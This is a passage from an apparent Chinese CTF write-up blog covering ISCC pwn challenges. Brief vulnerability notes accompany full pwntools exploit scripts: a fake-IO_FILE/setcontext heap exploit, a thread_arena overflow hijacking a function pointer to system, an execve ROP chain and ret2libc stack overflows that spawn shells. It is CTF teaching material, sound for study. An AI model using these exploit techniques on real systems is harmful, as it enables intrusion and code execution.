class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;context&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x420</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x410</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_add = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = libc_add - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">io_list_all = libcbase + <span class="number">0x1ed5a0</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;io_list_all &#x27;</span> + <span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> - <span class="number">1</span>) + <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">heap_add = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;heap_add &#x27;</span> + <span class="built_in">hex</span>(heap_add))</span><br><span class="line"></span><br><span class="line">fd = libcbase + <span class="number">0x1ecfd0</span></span><br><span class="line">payload = p64(fd) * <span class="number">2</span> + p64(heap_add) + p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x470</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">openadd = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readadd = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writeadd = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontextadd = libcbase + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">rdi = libcbase + <span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12 = libcbase + <span class="number">0x0000000000119431</span></span><br><span class="line">ret = libcbase + <span class="number">0x0000000000022679</span></span><br><span class="line"></span><br><span class="line">chunk_small = heap_add + <span class="number">0x850</span></span><br><span class="line">IO_wfile_jumps = libcbase + <span class="number">0x1e8f60</span></span><br><span class="line">fakeIO_add = chunk_small</span><br><span class="line">orw_add = fakeIO_add + <span class="number">0x200</span></span><br><span class="line">A = fakeIO_add + <span class="number">0x40</span></span><br><span class="line">B = fakeIO_add + <span class="number">0xe8</span> + <span class="number">0x40</span> - <span class="number">0x68</span></span><br><span class="line">C = fakeIO_add</span><br><span class="line"></span><br><span class="line">fake_IO = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(fakeIO_add)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(A)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(IO_wfile_jumps)</span><br><span class="line">fake_IO += p64(orw_add) + p64(ret) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">fake_IO += p64(B) + p64(setcontextadd + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">flag_add = orw_add + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">orw = p64(rdi) + p64(flag_add) + p64(rsi) + p64(<span class="number">0</span>) + p64(openadd)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>) + p64(rsi) + p64(flag_add) + p64(rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(readadd)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>) + p64(writeadd)</span><br><span class="line"></span><br><span class="line">payload = fake_IO</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += orw</span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2561831.png" alt="image-20240525024728264"></p>
<h4 id="shopping"><a href="#shopping" class="headerlink" title="shopping"></a>shopping</h4><p>IDA打开</p>
<p>发现漏洞点在堆输入的时候，输入长度的判断导致溢出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd246f26a.png" alt="image-20240525024947622"></p>
<p>在bss上调用了函数指针</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd258b869.png" alt="image-20240525025019342"></p>
<p>这样的话 思路就很清楚了</p>
<p>通过溢出篡改CALLW的指针指向system</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;attachment-11&quot;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">elf = ELF(path)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Enter the password:&#x27;</span>, <span class="string">&quot;I&#x27;m ready for shopping&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, n, content=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">b&#x27;Action:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">b&#x27;Item ID:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sh.sendlineafter(<span class="string">b&#x27;Quantity:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line">	<span class="keyword">if</span> content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		sh.sendlineafter(<span class="string">b&#x27;Add gift message? (0/1):&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh.sendlineafter(<span class="string">b&#x27;Add gift message? (0/1):&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">		sh.sendafter(<span class="string">b&#x27;Message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">	add(<span class="number">0x4000</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4000</span>, <span class="number">262</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x3FF0</span>)</span><br><span class="line"><span class="comment"># 溢出，修改thread_arena，将bss上的fake_chunk接到fastbin里</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x50</span> + p32(<span class="number">0</span>) + p32(<span class="number">3</span>) + <span class="number">10</span> * p64(<span class="number">0x60201d</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0xB</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(system_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25d6b0b.png" alt="image-20240525025342382"></p>
<h3 id="擂台题-4"><a href="#擂台题-4" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="Curious"><a href="#Curious" class="headerlink" title="Curious"></a>Curious</h4><p>没什么好说的</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;xxxx&#x27;</span>, port)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000452af7</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401912</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040181f</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004012d3</span>) <span class="comment"># syscall</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + p</span><br><span class="line">io.send(<span class="string">b&#x27;oh1yes&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="unheap"><a href="#unheap" class="headerlink" title="unheap"></a>unheap</h4><p>一样的</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./great&#x27;</span>)     </span><br><span class="line">io=remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">ret=<span class="number">0x0804840a</span>  </span><br><span class="line">elf_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">elf_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.\n&quot;</span>,<span class="string">b&quot;OK&quot;</span>)</span><br><span class="line">payload=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>)+p32(elf_plt)+p32(main_addr)+p32(elf_got)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(payload+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">elf_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,elf_addr)</span><br><span class="line">libcbase=elf_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.\n&quot;</span>,<span class="string">b&quot;OK&quot;</span>)</span><br><span class="line">payload1=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>)+p32(system_addr)+(<span class="string">b&#x27;aaaa&#x27;</span>)+p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!\n&quot;</span>,payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="great"><a href="#great" class="headerlink" title="great"></a>great</h4><p>看下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd242b1e7.png" alt="image-20240525141617156"></p>
<p>栈溢出</p>
<p>great函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2433779.png" alt="image-20240525141654011"></p>
<p>所以：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>,arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>) </span><br><span class="line">io = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port]) </span><br><span class="line">elf = ELF(<span class="string">&quot;./great&quot;</span>) </span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) </span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Do you enjoy ISCC?&quot;</span>,<span class="string">b&#x27;yes&#x27;</span>) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Then I will show you something great.&quot;</span>,<span class="string">b&#x27;OK&#x27;</span>) </span><br><span class="line"><span class="comment">#puts_plt = 0x08048490 </span></span><br><span class="line"><span class="comment">#puts_got = 0x0804A020 </span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">great = <span class="number">0x08048624</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(great) + p32(puts_got) </span><br><span class="line">io.recvuntil(<span class="string">&quot;Here it is!&quot;</span>) </span><br><span class="line">io.sendline(payload) </span><br><span class="line">puts_addr = u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr)) </span><br><span class="line">system = puts_addr -<span class="number">0x5f150</span> + <span class="number">0x3a950</span> </span><br><span class="line">binsh = puts_addr - <span class="number">0x5f150</span>+ <span class="number">0x15912b</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system) + p32(<span class="number">0</span>) + p32(binsh) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Here it is!&quot;</span>,payload) </span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>





